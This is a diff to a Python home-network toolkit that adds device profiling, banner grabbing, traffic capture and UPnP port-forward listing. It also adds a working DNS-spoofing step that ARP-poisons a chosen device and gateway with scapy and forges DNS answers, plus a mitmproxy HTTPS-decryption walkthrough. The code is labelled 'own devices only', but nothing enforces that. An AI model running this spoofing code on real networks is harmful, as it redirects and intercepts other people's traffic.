@@ -186,6 +186,74 @@ def is_private_mac(mac):
         return False
 
 
+# A few common OUIs for offline answers; anything else falls back to the
+# free macvendors.com API (we send only the 3-byte prefix, not the full MAC).
+_OUI_COMMON = {
+    "f4:27:56": "Technicolor (router)", "fc:ec:da": "Ubiquiti",
+    "b8:27:eb": "Raspberry Pi", "dc:a6:32": "Raspberry Pi",
+    "00:15:5d": "Microsoft (Hyper-V/WSL)", "48:46:c1": "Nokia/Sagemcom",
+}
+_oui_cache = {}
+
+
+def mac_vendor(mac):
+    """Best-effort manufacturer for a MAC. Randomized MACs have no vendor."""
+    if is_private_mac(mac):
+        return "(randomized)"
+    prefix = mac[:8].lower()
+    if prefix in _oui_cache:
+        return _oui_cache[prefix]
+    v = _OUI_COMMON.get(prefix, "")
+    if not v:
+        try:
+            import urllib.request
+            req = urllib.request.Request("https://api.macvendors.com/" + prefix,
+                                         headers={"User-Agent": "lan-toolkit"})
+            v = urllib.request.urlopen(req, timeout=4).read().decode().strip()
+        except Exception:
+            v = ""
+    _oui_cache[prefix] = v
+    return v or "?"
+
+
+def device_type(vendor, ports):
+    """Guess what a device is from its vendor and open ports."""
+    v = (vendor or "").lower()
+    ps = set(ports or [])
+    if 32400 in ps:                       return "Plex media server"
+    if 9100 in ps:                        return "Printer"
+    if 554 in ps:                         return "IP camera"
+    if 8009 in ps:                        return "Chromecast / cast device"
+    if "raspberry" in v:                  return "Raspberry Pi"
+    if "router" in v or 53 in ps:         return "Router / gateway"
+    if {445, 139} & ps:                   return "Windows PC / NAS"
+    if "apple" in v:                      return "Apple device"
+    if "samsung" in v:                    return "Samsung device"
+    if "xiaomi" in v:                     return "Xiaomi device"
+    if not ps:                            return "client (phone/tablet?)"
+    return "?"
+
+
+def grab_banner(ip, port, timeout=2.0):
+    """Read the greeting a TCP service sends (SSH/FTP/SMTP banners, HTTP Server
+    header). Returns a short string or ''."""
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(timeout)
+            if s.connect_ex((ip, port)) != 0:
+                return ""
+            if port in (80, 8080, 8000):      # HTTP: ask so it replies
+                s.sendall(b"HEAD / HTTP/1.0\r\nHost: %b\r\n\r\n" % ip.encode())
+            data = s.recv(256)
+            for line in data.split(b"\r\n"):
+                if port in (80, 8080, 8000) and line.lower().startswith(b"server:"):
+                    return line.decode("utf-8", "replace").strip()
+            first = data.split(b"\r\n")[0].decode("utf-8", "replace").strip()
+            return first[:80]
+    except Exception:
+        return ""
+
+
 def discover_devices(net):
     """Ping-sweep + ARP + name resolution. Returns rows, no printing."""
     ping_sweep(net["prefix"])
@@ -200,11 +268,12 @@ def discover_devices(net):
     return rows
 
 
-def print_devices(rows, indent=""):
-    print(f"{indent}{'IP':<16}{'MAC':<20}{'NAME':<22}{'PRIV':<6}NOTE")
-    print(f"{indent}{'-' * 62}")
+def print_devices(rows, indent="", vendors=True):
+    print(f"{indent}{'IP':<16}{'MAC':<20}{'NAME':<20}{'VENDOR':<22}NOTE")
+    print(f"{indent}{'-' * 80}")
     for ip, mac, name, priv, note in rows:
-        print(f"{indent}{ip:<16}{mac:<20}{name[:21]:<22}{priv:<6}{note}")
+        v = mac_vendor(mac) if (vendors and mac not in ("(this pc)",)) else ""
+        print(f"{indent}{ip:<16}{mac:<20}{name[:19]:<20}{v[:21]:<22}{note}")
 
 
 def step_discover(net):
@@ -276,13 +345,36 @@ def step_portscan(net):
         target = _pick_device(net, ipv6=False)
         if not target:
             return
+
     nmap = find_nmap()
-    if nmap:
-        print(f"\n[Step 2] nmap service scan of {target} (top 100 ports)...")
-        subprocess.run([nmap, "-sV", "-T4", "--top-ports", "100", target])
+    # Whole-subnet: just the service scan (per-host profiling would be slow).
+    if target.endswith("/24"):
+        if nmap:
+            print(f"\n[Step 2] nmap service scan of {target} (top 100 ports)...")
+            subprocess.run([nmap, "-sV", "-T4", "--top-ports", "100", target])
+        else:
+            print("nmap not found - scan one host at a time with the built-in scanner.")
+        return
+
+    # Single host: profile it (vendor -> type -> ports -> banners -> OS)
+    print(f"\n[Step 2] Profiling {target} ...")
+    mac = arp_table(net["prefix"]).get(target, "")
+    vendor = mac_vendor(mac) if mac else "?"
+    ports = scan_common(target)
+    print(f"  MAC/vendor : {mac or '?'}  {vendor}")
+    print(f"  Likely type: {device_type(vendor, ports)}")
+    if ports:
+        print("  Open ports :")
+        for p in ports:
+            banner = grab_banner(target, p)                 # [8] banner grab
+            print(f"    {p:<6} {port_name(p):<12}{banner}")
     else:
-        print("nmap not found - using built-in scanner (single host only).")
-        builtin_scan(target)
+        print("  Open ports : none (typical phone/tablet client)")
+
+    # [7] OS fingerprint via nmap (needs admin/root for the raw probes)
+    if nmap and input("\nRun OS fingerprint? (needs admin) [y/N]: ").strip().lower() == "y":
+        print(f"\nnmap -O {target} ...")
+        subprocess.run([nmap, "-O", "-sV", "--top-ports", "100", target])
 
 
 # ----------------------------------------------------------------------
@@ -296,7 +388,9 @@ payloads are encrypted - you see WHICH hosts, not the contents.
 """)
     print("  a) 15s DNS capture       (domains being looked up)")
     print("  b) 15s connections       (which servers this PC connects to - TLS SNI)")
-    sub = input("Choose a/b [a]: ").strip().lower() or "a"
+    print("  c) 15s top talkers       (bandwidth: which servers use the most data)")
+    print("  d) save 20s to a .pcap   (open later in Wireshark)")
+    sub = input("Choose a/b/c/d [a]: ").strip().lower() or "a"
 
     tshark = find_tshark()
     if not tshark:
@@ -306,6 +400,47 @@ payloads are encrypted - you see WHICH hosts, not the contents.
     if not iface:
         subprocess.run([tshark, "-D"])
         iface = input("Enter the Wi-Fi interface number from the list above: ").strip()
+
+    # [14] pcap export
+    if sub == "d":
+        path = os.path.join(HOME, "Downloads", "lan-capture.pcap")
+        print(f"\nCapturing 20s to {path} (browse to generate traffic)...")
+        try:
+            subprocess.run([tshark, "-i", iface, "-a", "duration:20", "-w", path])
+            print(f"Saved. Open it in Wireshark:  wireshark \"{path}\"")
+        except Exception as e:
+            print(f"Capture failed ({e}). Npcap may need an admin shell.")
+        return
+
+    # [13] top talkers / per-host bandwidth
+    if sub == "c":
+        print(f"\nMeasuring bandwidth for 15s on interface {iface} ...")
+        print("(only THIS PC's traffic is visible unless you're intercepting)\n")
+        try:
+            cap = subprocess.run([tshark, "-i", iface, "-a", "duration:15", "-n",
+                                  "-T", "fields", "-e", "ip.src", "-e", "ip.dst",
+                                  "-e", "frame.len"], capture_output=True, text=True).stdout
+        except Exception as e:
+            print(f"Capture failed ({e})."); return
+        me = net["ip"]
+        bytes_by_peer = {}
+        for line in cap.splitlines():
+            p = line.split("\t")
+            if len(p) != 3 or not p[2].isdigit():
+                continue
+            peer = p[1] if p[0] == me else p[0]      # the non-local side
+            if peer and peer != me and not peer.startswith("224.") and peer != "255.255.255.255":
+                bytes_by_peer[peer] = bytes_by_peer.get(peer, 0) + int(p[2])
+        top = sorted(bytes_by_peer.items(), key=lambda kv: -kv[1])[:10]
+        if not top:
+            print("  (no traffic seen - try while something is downloading/streaming)")
+        print(f"  {'KB':>8}  SERVER")
+        print("  " + "-" * 50)
+        for peer, b in top:
+            rdns, org = _ip_lookup(peer)
+            label = rdns or org or peer
+            print(f"  {b/1024:8.1f}  {peer:<16}{label}")
+        return
 
     if sub == "b":
         # TLS ClientHello carries the destination server name (SNI) in clear text
@@ -359,6 +494,69 @@ def _listening_ports():
     return [f"{p} {port_name(p)}" for p in sorted(seen)]
 
 
+def _upnp_mappings():
+    """Ask the router's UPnP IGD for its port-forward table. Returns a list of
+    mapping strings, [] if none, or None if no IGD responded. Pure stdlib."""
+    import urllib.request
+    from urllib.parse import urljoin
+    msg = ("M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\n"
+           'MAN:"ssdp:discover"\r\nMX:2\r\n'
+           "ST:urn:schemas-upnp-org:service:WANIPConnection:1\r\n\r\n")
+    location = None
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        s.settimeout(3)
+        s.sendto(msg.encode(), ("239.255.255.250", 1900))
+        data, _ = s.recvfrom(65535)
+        s.close()
+        for line in data.decode("utf-8", "replace").split("\r\n"):
+            if line.lower().startswith("location:"):
+                location = line.split(":", 1)[1].strip()
+    except Exception:
+        return None
+    if not location:
+        return None
+    try:
+        xml = urllib.request.urlopen(location, timeout=4).read().decode("utf-8", "replace")
+    except Exception:
+        return None
+    ctrl = stype = None
+    for m in re.finditer(r"<service>(.*?)</service>", xml, re.S):
+        blk = m.group(1)
+        if "WANIPConnection" in blk or "WANPPPConnection" in blk:
+            cm = re.search(r"<controlURL>(.*?)</controlURL>", blk)
+            tm = re.search(r"<serviceType>(.*?)</serviceType>", blk)
+            if cm and tm:
+                ctrl, stype = urljoin(location, cm.group(1).strip()), tm.group(1).strip()
+                break
+    if not ctrl:
+        return None
+    results = []
+    for i in range(50):
+        body = ('<?xml version="1.0"?><s:Envelope '
+                'xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
+                's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body>'
+                f'<u:GetGenericPortMappingEntry xmlns:u="{stype}">'
+                f'<NewPortMappingIndex>{i}</NewPortMappingIndex>'
+                '</u:GetGenericPortMappingEntry></s:Body></s:Envelope>')
+        req = urllib.request.Request(ctrl, data=body.encode(),
+              headers={"Content-Type": 'text/xml; charset="utf-8"',
+                       "SOAPAction": f'"{stype}#GetGenericPortMappingEntry"'})
+        try:
+            resp = urllib.request.urlopen(req, timeout=4).read().decode("utf-8", "replace")
+        except Exception:
+            break   # index past the end -> SOAP fault -> we're done
+        g = lambda t: (re.search(f"<{t}>(.*?)</{t}>", resp) or [None, ""])[1] \
+            if re.search(f"<{t}>(.*?)</{t}>", resp) else ""
+        if not g("NewExternalPort"):
+            break
+        results.append(f"{g('NewProtocol'):<4} ext:{g('NewExternalPort')} -> "
+                       f"{g('NewInternalClient')}:{g('NewInternalPort')}  "
+                       f"({g('NewPortMappingDescription')})")
+    return results
+
+
 def step_remote(net):
     print("\n[Step 4] Remote access to your own devices")
     print(f"""  SSH out:        ssh user@<ip>
@@ -386,6 +584,33 @@ def step_remote(net):
             print(f"  port {item}")
     else:
         print("  (no common server ports listening - this PC is a pure client)")
+
+    # [9] what the router has forwarded/opened to the internet (UPnP)
+    print("\nRouter port-forwards (UPnP IGD):")
+    maps = _upnp_mappings()
+    if maps is None:
+        print("  (no UPnP IGD responded - UPnP off or unsupported on this router)")
+    elif not maps:
+        print("  none - nothing forwarded to the internet (good)")
+    else:
+        for m in maps:
+            print("  " + m)
+
+    # [21] launch an actual remote session to a chosen device
+    if input("\nConnect to a device now? [y/N]: ").strip().lower() == "y":
+        ip = _pick_device(net, ipv6=False)
+        if ip:
+            proto = (input(f"{ip}: (s)sh / (r)dp / (v)nc [s]: ").strip().lower() or "s")
+            if proto == "s":
+                user = input("SSH username: ").strip() or "root"
+                subprocess.run(["ssh", f"{user}@{ip}"])
+            elif proto == "r":
+                if IS_WIN:
+                    subprocess.run(["mstsc", f"/v:{ip}"])
+                else:
+                    print(f"  Use an RDP client, e.g.:  xfreerdp /v:{ip}")
+            elif proto == "v":
+                print(f"  Open your VNC viewer to {ip}:5900")
 
 
 # ----------------------------------------------------------------------
@@ -890,6 +1115,134 @@ def step_intercept(net, target=None):
 
 
 # ----------------------------------------------------------------------
+# STEP 6 - DNS SPOOFING  (YOUR OWN devices only)
+# ----------------------------------------------------------------------
+# While ARP-spoofing a target, answer its DNS queries for a chosen domain
+# with a forged IP (classic redirect). Only on your own network/devices.
+def step_dnsspoof(net, target=None, domain=None, redirect=None):
+    print("\n[Step 6] DNS SPOOF - redirect a domain  (YOUR OWN devices only)")
+    if target is None:
+        target = _pick_device(net, ipv6=False)
+        if not target:
+            return
+    if not _is_admin():
+        print("\nNeeds admin/root for packet injection.")
+        extra = ["--dnsspoof", target]
+        if domain:
+            extra += [domain, redirect or net["ip"]]
+        _relaunch_elevated(extra)
+        return
+
+    if not domain:
+        domain = input("Domain to spoof (e.g. example.com): ").strip()
+    if not domain:
+        print("  No domain."); return
+    if not redirect:
+        redirect = input(f"Redirect it to which IP [{net['ip']}]: ").strip() or net["ip"]
+
+    try:
+        from scapy.all import (ARP, Ether, IP, UDP, DNS, DNSQR, DNSRR,
+                               srp, sendp, sniff, conf)
+    except ImportError:
+        print("  Needs scapy: pip install scapy"); return
+
+    gw = net["gateway"]
+
+    def mac_of(ip):
+        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
+                     timeout=2, retry=2, verbose=0)
+        return ans[0][1].hwsrc if ans else None
+
+    t_mac, g_mac = mac_of(target), mac_of(gw)
+    if not t_mac or not g_mac:
+        print("  Could not resolve MACs."); return
+    alias = _fwd_alias()
+    _set_forwarding(alias, "Enabled")
+    stop = threading.Event()
+
+    def poison():
+        pt = Ether(dst=t_mac) / ARP(op=2, pdst=target, hwdst=t_mac, psrc=gw)
+        pg = Ether(dst=g_mac) / ARP(op=2, pdst=gw, hwdst=g_mac, psrc=target)
+        while not stop.is_set():
+            sendp(pt, verbose=0); sendp(pg, verbose=0); stop.wait(2)
+
+    th = threading.Thread(target=poison, daemon=True); th.start()
+    print(f"\nSpoofing {domain} -> {redirect} for {target} (30s, Ctrl+C to stop)...")
+    stats = {"seen": 0, "spoofed": 0}
+
+    def handle(pkt):
+        if pkt.haslayer(DNSQR):
+            stats["seen"] += 1
+            if domain.encode() in pkt[DNSQR].qname:
+                reply = (Ether(dst=pkt[Ether].src, src=pkt[Ether].dst) /
+                         IP(dst=pkt[IP].src, src=pkt[IP].dst) /
+                         UDP(dport=pkt[UDP].sport, sport=53) /
+                         DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
+                             an=DNSRR(rrname=pkt[DNSQR].qname, ttl=60, rdata=redirect)))
+                sendp(reply, verbose=0)
+                stats["spoofed"] += 1
+                print(f"  spoofed {pkt[DNSQR].qname.decode(errors='replace')} -> {redirect}")
+
+    try:
+        sniff(filter=f"udp port 53 and src host {target}", prn=handle,
+              timeout=30, store=0)
+    except Exception as e:
+        print(f"  sniff failed: {e}")
+    finally:
+        stop.set(); th.join(timeout=3)
+        fix_t = Ether(dst=t_mac) / ARP(op=2, pdst=target, hwdst=t_mac, psrc=gw, hwsrc=g_mac)
+        fix_g = Ether(dst=g_mac) / ARP(op=2, pdst=gw, hwdst=g_mac, psrc=target, hwsrc=t_mac)
+        for _ in range(15):
+            sendp(fix_t, verbose=0); sendp(fix_g, verbose=0); time.sleep(0.2)
+        _set_forwarding(alias, "Disabled")
+        msg = (f"plaintext DNS queries seen from {target}: {stats['seen']}  |  "
+               f"spoofed: {stats['spoofed']}")
+        print(f"  {msg}")
+        if stats["seen"] == 0:
+            print("  (0 plaintext queries = target is using encrypted DNS (DoT/DoH))")
+        print("  Restored ARP + forwarding. Done.")
+        try:
+            with open(os.path.join(HOME, "Downloads", "dnsspoof.txt"), "w",
+                      encoding="utf-8") as f:
+                f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')}  {domain} -> {redirect}\n{msg}\n")
+        except OSError:
+            pass
+
+
+# ----------------------------------------------------------------------
+# STEP 7 - DECRYPT HTTPS via your own CA  (YOUR OWN device only)
+# ----------------------------------------------------------------------
+# Reading HTTPS *content* (not just SNI) needs a full TLS proxy whose CA
+# the device trusts - i.e. mitmproxy + its certificate installed on a phone
+# YOU control. This sets up / explains that workflow; it does not weaken
+# anyone else's security.
+def step_decrypt(net):
+    print("\n[Step 7] DECRYPT HTTPS via your own CA  (YOUR OWN device only)")
+    mitm = shutil.which("mitmweb") or shutil.which("mitmdump") or shutil.which("mitmproxy")
+    print("""
+To read HTTPS *contents* you must terminate TLS yourself with a proxy whose
+root certificate the target device trusts. This only works on a device you
+control (you have to install the certificate on it).
+
+Workflow:
+  1. Install mitmproxy:            pip install mitmproxy
+  2. Start it (a proxy on :8080):  mitmweb   (or mitmdump)
+  3. On YOUR phone's Wi-Fi settings, set the HTTP proxy to this PC:
+        proxy host = {ip} , port = 8080
+  4. On the phone, open  http://mitm.it  and install + TRUST the CA cert
+     (Android 14: Settings > Security > encrypt... > install from storage;
+      note user-CAs are not trusted by apps that pin certs).
+  5. Browse on the phone - mitmproxy shows full decrypted requests.
+""".format(ip=net["ip"]))
+    if mitm:
+        if input(f"Launch {os.path.basename(mitm)} now? [y/N]: ").strip().lower() == "y":
+            subprocess.Popen([mitm])
+            print("  Launched. Set the phone's proxy and install the CA as above.")
+    else:
+        print("  mitmproxy not installed yet - run:  pip install mitmproxy")
+
+
+# ----------------------------------------------------------------------
 # JSON baseline helpers (used by the auto report)
 # ----------------------------------------------------------------------
 def _load_json(path):
@@ -917,6 +1270,8 @@ MENU = """
   3) Read traffic (DNS / connections, via tshark)
   4) Remote access helpers
   5) Intercept a device's traffic   (auto IPv4/IPv6, your own devices only)
+  6) DNS spoof - redirect a domain  (your own devices only)
+  7) Decrypt HTTPS via your own CA  (your own device only)
   q) Quit
 """
 
@@ -1041,6 +1396,7 @@ def run_menu(net):
     actions = {
         "1": step_discover, "2": step_portscan, "3": step_traffic,
         "4": step_remote, "5": step_intercept,
+        "6": step_dnsspoof, "7": step_decrypt,
     }
     while True:
         try:
@@ -1056,7 +1412,7 @@ def run_menu(net):
                     print(f"Error: {e}")
                 input("\n[Enter] to return to the menu ...")   # keep results on screen
             else:
-                print("Pick 1-5 or q.")
+                print("Pick 1-7 or q.")
         except KeyboardInterrupt:
             print("\nInterrupted - back to menu. (q to quit)")
 
@@ -1165,6 +1521,17 @@ def main():
         nxt = args[i + 1] if i + 1 < len(args) else None
         target = nxt if (nxt and ":" in nxt) else None
         step_ndp(net, target)
+        return
+
+    # --dnsspoof <ip> [domain] [redirect-ip] : DNS spoof a device. With domain
+    # + redirect it runs non-interactively (used by the elevation relaunch).
+    if "--dnsspoof" in args:
+        i = args.index("--dnsspoof")
+        rest = args[i + 1:]
+        target = rest[0] if rest and re.match(r"^\d{1,3}(\.\d{1,3}){3}$", rest[0]) else None
+        domain = rest[1] if len(rest) > 1 else None
+        redirect = rest[2] if len(rest) > 2 else None
+        step_dnsspoof(net, target, domain, redirect)
         return
 
     # Default = automatic full report. Use --menu / -m for the interactive menu.
